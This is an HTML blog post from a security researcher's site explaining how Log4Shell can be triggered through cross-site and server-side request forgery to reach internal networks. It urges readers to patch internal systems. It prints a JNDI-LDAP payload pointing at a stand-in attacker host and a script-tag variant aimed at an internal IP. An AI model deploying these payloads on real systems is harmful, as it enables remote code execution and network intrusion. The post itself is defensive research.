@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head prefix="og: http://ogp.me/ns#">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+  <meta property="og:title" content=" Log4Shell and Request Forgery Attacks &middot;  Embrace The Red" />
+  
+  <meta property="og:site_name" content="Embrace The Red" />
+  <meta property="og:url" content="https://embracethered.com/blog/posts/2022/log4shell-and-request-forgery-attacks/" />
+  
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:article:published_time" content="2022-01-04T15:18:18-08:00" />
+  
+  <meta property="og:article:tag" content="pentest" />
+  
+  <meta property="og:article:tag" content="red" />
+  
+  <meta property="og:article:tag" content="research" />
+  
+  
+
+  <title>
+     Log4Shell and Request Forgery Attacks &middot;  Embrace The Red
+  </title>
+
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/main.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/font-awesome.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/github.css" />
+  
+  <link rel="stylesheet" href="https://embracethered.com/blog/fonts/cachedfonts.css" type="text/css">
+  <link rel="shortcut icon" href="https://embracethered.com/blog/images/favicon.ico" />
+  <link rel="apple-touch-icon" href="https://embracethered.com/blog/images/apple-touch-icon.png" />
+  
+
+  
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@wunderwuzzi23">
+<meta name="twitter:title" content="Log4Shell and Request Forgery Attacks">
+<meta name="twitter:description" content="Beware of Log4Shell and Request Forgery Attacks">
+<meta name="twitter:image" content="https://embracethered.com/blog/images/2022/log4shell.png">
+
+<meta name="twitter:creator" content="@wunderwuzzi23">
+
+
+
+
+
+</head>
+<body>
+    <header class="global-header"  style="background-image:url( /blog/images/bg.png )">
+    <section class="header-text">
+      <h1><a href="https://embracethered.com/blog/">Embrace The Red</a></h1>
+      
+      <div class="tag-line" style="min-width:fit-content; font-weight: 400;">
+        wunderwuzzi&#39;s blog
+        <br><a style="color: greenyellow; font-weight:300;text-decoration: underline; " href="https://www.amazon.com/gp/product/1838828869/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=1838828869&linkCode=as2&tag=wunderwuzzi-20&linkId=b6523e937607be47499c6010ff489537">OUT NOW: Cybersecurity Attacks - Red Team Strategies</a> 
+      </div>
+      
+      <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+</div>
+
+      
+      <a href="https://embracethered.com/blog/" class="btn-header btn-back hidden-xs">
+        <i class="fa fa-angle-left" aria-hidden="true"></i>
+        &nbsp;Home
+      </a>
+      
+    
+      <a href="/blog/index.xml" class="btn-header btn-subscribe hidden-xs">
+        <i class="fa fa-rss" aria-hidden="true"></i>
+        &nbsp;Subscribe
+      </a>
+    </section>
+  </header>
+  <main class="container">
+
+
+<article>
+  <header>
+    <h1 class="text-primary">Log4Shell and Request Forgery Attacks</h1>
+    <div class="post-meta clearfix">
+    
+      <div class="post-date pull-left">
+        Posted on
+        <time datetime="2022-01-04T15:18:18-08:00">
+          Jan 4, 2022
+        </time>
+      </div>
+    
+      <div class="pull-right">
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/pentest">#pentest</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/red">#red</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/research">#research</a></span>
+        
+      </div>
+    </div>
+  </header>
+  <section>
+    <p>The last weeks of 2021 got quite interesting for security professionals.</p>
+<p>Apache&rsquo;s <a href="https://logging.apache.org/log4j/2.x/">log4j library</a> and its now prominent <a href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html">Java Naming and Directory Interface support</a>, which enables easy remote code execution, made the news across the industry.</p>
+<p>What makes Log4Shell scary is the widespread adoption of the log4j library amongst Java applications, and the ease of remote exploitation.</p>
+<p><strong>A dangerous combination.</strong></p>
+<p>Patches got released, bypasses were discovered more patches were released and so forth.</p>
+<p>A lot has been written and great information is out there around <a href="https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/">discovery</a>, <a href="https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/#exploit">exploitation</a> as well as <a href="https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance">mitigations</a>. This post is not intended to repeat that information.</p>
+<p><img src="/blog/images/2022/log4shell.png" alt="Log4Shell and Request Forgery Attacks"></p>
+<p>However, an area that has not gotten a lot of attention is the exploitation of Log4Shell in Request Forgery Attacks that target internal infrastructure and web servers from the outside by using the browser or a vulnerable service as confused deputy.</p>
+<h2 id="what-are-request-forgery-attacks">What are Request Forgery Attacks?</h2>
+<p>Request Forgery Attacks create requests that have unintended consequences for the victim of the attack.</p>
+<p>These can typically be put in two categories, based on where the request is forged (client or server)</p>
+<ol>
+<li><strong>Cross-Site Request Forgery Attacks</strong> - these attacks make the client/browser connect to resources and trigger unintended actions. This attactypically leverages authentication tokens to invoke privileged operations on the users behalf via a web browser.</li>
+<li><strong>Server-Side Request Forgery Attacks</strong> (SSRF) - these attacks create a request on the server side, where an attacker is able to provide a URL to the server and the server will later connect to that URL. This could be via a wide range of destinations and protocols (localhost, internal networks, http, ftp, ldap,&hellip;)</li>
+</ol>
+<p>Both kinds of request forgery vulnerabilities are quite common in web application and services. Also see the <a href="https://en.wikipedia.org/wiki/Confused_deputy_problem">confused deputy problem</a> for a generic explanation of this kind of security issue.</p>
+<h2 id="why-is-this-interesting-in-regard-to-log4j">Why is this interesting in regard to Log4j?</h2>
+<p><strong>What makes request forgery attacks so powerful in regard to Log4j is that the Log4j vulnerability often can be triggered without any form of authentication</strong>.</p>
+<p>This makes Cross-Site Request Forgery Attacks that target local or internal network resources very plausible. The same goes for the Server-Side attack scenarios.</p>
+<p>Any Server-Side feature which allows a user to specify a URL to control where a service connects to can potentially be leveraged to target internal infrastructure and probe for the log4j vulnerability.</p>
+<h2 id="simple-get-requests-trigger-log4shell">Simple GET requests trigger Log4Shell</h2>
+<p>Remember that in many cases all that is needed to reach a vulnerable log4j system is a GET request with a query parameter that contains the attack payload, for example:</p>
+<p><code>?username=${jndi:ldap://attacker/p}</code></p>
+<p>This payload can be provided by a malicious web page, e.g. when loading <code>image</code> or <code>script</code> tags:</p>
+<p><code>&lt;script src=&quot;https://10.0.0.1/?username=${jndi:ldap://attacker/p}&quot;&gt;</code></p>
+<p>This request will attack an internal network (such as the <code>10.0.0.1</code> IP address). It can also target applications installed on <code>localhost</code> (including phones!) of the victim browsing the Internet.</p>
+<p><img src="/blog/images/2022/glasses.png" alt="Log4Shell and Request Forgery Attacks - Log4 What?"></p>
+<p>An adversary can automate and scale this technique via JavaScript and AJAX requests or by just adding more tags in the HTML document.</p>
+<p>Beware of this attack vector (possibly in combination with phishing attacks) patch and protect internally facing applications as well.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>This post discussed how both Cross-Site (client based) and Server-Side Request Forgery Attacks can lead to succesful exploitation of the log4j vulnerability.</p>
+<p><strong>If you were solely focused on patching externally facing applications and services expand your analysis to everything, including internal infrastructure, as well as developer and end user machines.</strong></p>
+<p><a href="https://chromestatus.com/feature/5436853517811712">Chrome and Edge</a> seem to add more restrictions for browsers to talk to private networks as well.</p>
+<p>Keep scanning and patching!</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://logging.apache.org/log4j/2.x/">Apache Log4j Overview</a></li>
+<li><a href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html">JNDI Overview</a></li>
+<li><a href="https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance">CISA - Apache Log4j Vulnerabilty Guidance</a></li>
+<li><a href="https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/#exploit">Apache Log4j Vulnerability - Exploit</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Confused_deputy_problem">Confused Deputy Problem</a></li>
+<li><a href="https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/">Guidance for preventing, detecting and hunting for CVE 2021-44228</a></li>
+<li><a href="https://chromestatus.com/feature/5436853517811712">Feature: Restrict &ldquo;private network requests&rdquo; for subresources from public websites to secure contexts</a></li>
+<li>Image with the glasses taken from Microsoft Image search included in PowerPoint - credit goes to whoever created the image.</li>
+</ul>
+
+  </section>
+  <footer>
+    
+    
+    
+    <footer></footer><hr/>
+    
+    <ul class="pager">
+      
+      <li class="next disabled"><a href="#">Newer <span aria-hidden="true">&rarr;</span></a></li>
+      
+      
+      <li class="author-contact">
+        <a href="mailto:security@wunderwuzzi.net">
+          <i class="fa fa-envelope-o" aria-hidden="true"></i>
+          &nbsp;Contact me
+        </a>
+     </li>
+
+      
+      
+      <li class="previous"><a href="https://embracethered.com/blog/posts/2021/video-anatomy-of-a-compromise/"><span aria-hidden="true">&larr;</span> Older</a></li>
+      
+    </ul>
+  </footer>
+</article>
+</main>
+  <footer class="container global-footer">
+    <div class="copyright-note pull-left">
+     
+     (c) WUNDERWUZZI 2018-2022
+     <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+</div>
+ 
+     <div style="font-size:small;font-style: italic;color:crimson">
+    Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet. 
+    </div>
+    </div>
+</footer>
+  <script src="https://embracethered.com/blog/js/highlight.pack.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad();
+  </script>
+  
+  
+
+
+
+<script type="text/javascript">
+  var _paq = window._paq || [];
+  _paq.push(["disableCookies"]);
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="//wuzzi.net/anamato/inc/";
+    _paq.push(['setTrackerUrl', u+'rts.php']);
+    _paq.push(['setSiteId', '1']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'rts.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<img src="https://wuzzi.net/anamato/inc/rts.php?idsite=1&amp;rec=1" style="border:0;" alt="" />
+  
+</body>
+</html>
+
